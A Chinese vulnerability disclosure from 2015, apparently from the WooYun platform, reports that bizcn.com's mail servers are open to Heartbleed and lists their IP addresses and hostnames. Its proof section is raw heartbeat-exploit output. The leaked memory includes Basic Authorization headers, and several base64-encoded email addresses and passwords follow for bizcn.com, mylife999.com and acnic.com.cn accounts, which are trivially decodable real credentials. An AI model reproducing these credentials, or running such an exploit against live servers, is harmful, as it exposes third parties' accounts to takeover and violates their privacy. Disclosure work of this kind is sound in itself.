wybug_title: 商务中国某问题导致邮箱登陆
wybug_detail:
漏洞详情 披露状态：   									2015-07-06：	细节已通知厂商并且等待厂商处理中									2015-07-06：	厂商已经确认，细节仅向厂商公开									2015-07-16：	细节向核心白帽子及相关领域专家公开									2015-07-26：	细节向普通白帽子公开									2015-08-05：	细节向实习白帽子公开									2015-08-20：	细节向公众公开  简要描述：  详细说明：  
202.102.89.218	pop.bizcn.com202.102.89.217118.145.20.237	mail.bizcn.com
   漏洞证明：  
Connecting 202.102.89.218:443...Sending Client Hello...Waiting for Server Hello... ... received message: type = 22, ver = 0302, length = 58 ... received message: type = 22, ver = 0302, length = 949 ... received message: type = 22, ver = 0302, length = 525 ... received message: type = 22, ver = 0302, length = 4Sending heartbeat request... ... received message: type = 24, ver = 0302, length = 16384Received heartbeat response:.@....SC[...r....+..H...9..w.3....f.....".!.9.8...5.....3.2.....E.D...../...A...I.....4.2...#.: */*..Accept-Language: zh-cn..Accept-Encoding: gzip, deflate..Connection: keep-alive..MS-ASProtocolVersion: 2.5..User-Agent: Apple-iPhone7C2/1206.70..Authorization: Basic eWFuZ2RpbmdAYml6Y24uY29tOlN3b3JkQDEyMw==..Content-Length: 106..X-MS-PolicyKey: 225906399....X.s..<2...).C.M.'....C.jC0m...抓到的邮箱和登陆密码，base64加密。神奇的是从218抓，抓到其他公司的邮箱和密码？几个例子dGVuZ2RhQG15bGlmZTk5OS5jb206SWhpXzc3NDU3Nw==       mylife999.combmF0ZS55YW5nQGFjbmljLmNvbS5jbjpOYXRlYzAwNjEyNQ==   acnic.com.cneWFuZ2RpbmdAYml6Y24uY29tOlN3b3JkQDEyMw==           bizcn.com登陆商务中国的邮箱




   修复方案：  ~~   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-07-06 18:20 厂商回复： 已经发现问题，正在查询处理中 最新状态： 暂无
